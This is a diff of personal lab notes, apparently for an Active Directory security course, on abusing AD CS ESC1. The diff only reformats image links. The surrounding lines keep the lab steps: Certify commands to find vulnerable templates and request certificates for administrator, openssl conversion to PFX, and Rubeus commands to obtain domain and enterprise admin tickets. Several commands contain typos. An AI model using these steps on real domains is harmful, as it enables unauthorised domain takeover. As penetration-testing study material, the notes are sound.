@@ -1,5 +1,5 @@
-![[assets/Pasted image 20260224072047.png]]
-![[assets/Pasted image 20260224072424.png]]
+![Pasted image 20260224072047](assets/Pasted%20image%2020260224072047.png)
+![Pasted image 20260224072424](assets/Pasted%20image%2020260224072424.png)
 
 
 Can use [Certify](https://github.com/GhostPack/Certify) to enumerate AD CS in the target forest
@@ -18,8 +18,8 @@ Enumerate vulnerable templates
 Check ENROLLEE_SUPPLIES_SUBJECT (for ESC1)
 - make sure to check enrollment rights
 `Certify.exe find /enrolleeSuppliesSubject`
-![[assets/Pasted image 20260318054042.png]]
-![[assets/Pasted image 20260318054133.png]]
+![Pasted image 20260318054042](assets/Pasted%20image%2020260318054042.png)
+![Pasted image 20260318054133](assets/Pasted%20image%2020260318054133.png)
 
 
 In order to abuse AD CS, you need the following access right when running `cas` flag
@@ -86,28 +86,28 @@ check learning objective for intermittent steps such as converting pem to pfx
 test enrollment rights for the target template
 `Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator`
 - if it works you should get the certificate
-![[assets/Pasted image 20260318054258.png]]
-![[assets/Pasted image 20260318054326.png]]
+![Pasted image 20260318054258](assets/Pasted%20image%2020260318054258.png)
+![Pasted image 20260318054326](assets/Pasted%20image%2020260318054326.png)
 - can see "the certificate has been issued" at the bottom
 - copy output and save it to a file called "esc1.pem"
 
 use openssl to convert the pem file to pfx
 - it will ask for export password, which is the "SecretPass@123" seen earlier
 `C:\AD\Tools\openssl\openssl.exe -kcs12 -in C:\AD\Tools\esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-DA.pfx`
-![[assets/Pasted image 20260318054624.png]]
+![Pasted image 20260318054624](assets/Pasted%20image%2020260318054624.png)
 - "unable to write to random state" is fine to see
 
 
 request the TGT for DA using Rubeus
 `C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /cerificate:C:\AD\Tools\esc1-DA.pfx /password:SecretPass@123 /ptt`
-![[assets/Pasted image 20260318054801.png]]
+![Pasted image 20260318054801](assets/Pasted%20image%2020260318054801.png)
 - can now access any resource in the domain
 
 
 can also go for enterprise admin with a very similar process
 - only difference is that you change the altname to the forest root's admin
 `C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:moneycorp.local\administrator`
-![[assets/Pasted image 20260318054946.png]]
+![Pasted image 20260318054946](assets/Pasted%20image%2020260318054946.png)
 - save to a pem file, then convert just like with DA
 
 
@@ -120,5 +120,5 @@ request the TGT for EA
 `C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:moneycorplocal\Administrator /dc:mcorp-dc.moneycorp.local /cerificate:C:\AD\Tools\esc1-EA.pfx /password:SecretPass@123 /ptt`
 - doing EA also requires the /domain flag to be filled out
 - can now access forest root
-![[assets/Pasted image 20260318055347.png]]
+![Pasted image 20260318055347](assets/Pasted%20image%2020260318055347.png)
 
